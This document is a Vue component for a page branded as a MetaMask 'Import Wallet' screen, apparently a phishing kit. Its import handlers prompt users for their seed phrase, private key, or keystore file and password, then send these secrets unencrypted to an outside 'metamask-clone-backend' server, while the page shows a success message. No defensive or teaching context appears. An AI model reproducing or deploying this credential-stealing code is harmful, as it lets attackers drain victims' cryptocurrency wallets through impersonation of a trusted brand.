<template>
  <div class="import-wallet-container">
    <img src="https://cdn.jsdelivr.net/gh/MetaMask/brand-resources/SVG/metamask-fox.svg" alt="MetaMask Logo" class="metamask-logo" />
    <h1>Import MetaMask Wallet</h1>
    <div class="import-options">
      <button class="option" @click="importWithSeed">Import using Seed Phrase</button>
      <button class="option" @click="importWithPrivateKey">Import using Private Key</button>
      <button class="option" @click="importWithKeystore">Import using Keystore File</button>
      <button class="option" @click="importWithHardwareWallet">Import with Hardware Wallet</button>
      <button class="option" @click="importWithWalletConnect">Import with WalletConnect</button>
    </div>
    <div v-if="error" class="error">{{ error }}</div>
  </div>
</template>

<script>
import { ethers } from "ethers";
import detectEthereumProvider from "@metamask/detect-provider";
import WalletConnectProvider from "@walletconnect/web3-provider";

export default {
  data() {
    return {
      error: null,
      provider: null,
    };
  },
  mounted() {
    this.setupProvider();
  },
  methods: {
    async setupProvider() {
      const provider = await detectEthereumProvider();
      if (provider) {
        this.provider = new ethers.providers.Web3Provider(provider);
      } else {
        this.redirectToMetaMask();
      }
    },
    redirectToMetaMask() {
      window.location.href = "https://metamask.io/download/";
    },
    async importWithSeed() {
      const seed = prompt("Enter your 12 or 24-word seed phrase");
      if (seed) {
        await this.sendToBackend("seed", seed);
      }
    },
    async importWithPrivateKey() {
      const privateKey = prompt("Enter your private key");
      if (privateKey) {
        await this.sendToBackend("privateKey", privateKey);
      }
    },
    async importWithKeystore() {
      const file = await this.selectFile();
      if (file) {
        const fileContent = await file.text();
        const password = prompt("Enter your keystore password");
        try {
          const wallet = await ethers.Wallet.fromEncryptedJson(fileContent, password);
          await this.sendToBackend("keystore", { fileContent, password });
        } catch (error) {
          this.error = "Invalid keystore or password.";
        }
      }
    },
    async importWithHardwareWallet() {
      if (this.provider) {
        const signer = this.provider.getSigner();
        const address = await signer.getAddress();
        await this.sendToBackend("hardwareWallet", address);
      }
    },
    async importWithWalletConnect() {
      const walletConnect = new WalletConnectProvider({
        rpc: {
          1: "https://cloudflare-eth.com"
        }
      });
      await walletConnect.enable();
      const provider = new ethers.providers.Web3Provider(walletConnect);
      const signer = provider.getSigner();
      const address = await signer.getAddress();
      await this.sendToBackend("walletConnect", address);
    },
    async sendToBackend(type, data) {
      try {
        const response = await fetch("https://metamask-clone-backend.vercel.app/api/import-wallet", {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
            "Referer": window.location.href
          },
          body: JSON.stringify({ type, data }),
        });
        const result = await response.json();
        if (result.success) {
          alert("Wallet imported successfully!");
        } else {
          this.error = result.error || "Unknown error";
        }
      } catch (err) {
        console.error("Failed to send data to the backend:", err);
        this.error = "Failed to send data to the backend";
      }
    },
    async selectFile() {
      return new Promise((resolve) => {
        const input = document.createElement("input");
        input.type = "file";
        input.accept = ".json";
        input.onchange = (e) => {
          resolve(e.target.files[0]);
        };
        input.click();
      });
    },
  },
};
</script>

<style scoped>
.import-wallet-container {
  padding: 20px;
  max-width: 600px;
  margin: 0 auto;
  text-align: center;
}

.metamask-logo {
  width: 100px;
  margin-bottom: 20px;
}

.import-options {
  display: flex;
  flex-wrap: wrap;
  justify-content: space-around;
}

.option {
  display: inline-block;
  margin: 10px;
  padding: 10px 20px;
  border: none;
  border-radius: 5px;
  background-color: #f6851b;
  color: white;
  font-size: 16px;
  cursor: pointer;
  transition: background-color 0.3s;
}

.option:hover {
  background-color: #e2761b;
}

.error {
  color: red;
  margin-top: 20px;
}
</style>
